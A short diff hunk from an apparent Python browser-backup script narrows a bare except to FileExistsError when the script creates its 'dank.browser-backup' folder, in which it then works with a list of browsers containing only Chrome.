@@ -119,7 +119,7 @@ def main():
     try: os.chdir(get_path('Documents'))
     except: os.chdir("C:\\")
     try: os.makedirs('dank.browser-backup')
-    except: pass
+    except FileExistsError: pass
     os.chdir('dank.browser-backup')
     
     browsers = ['Chrome']
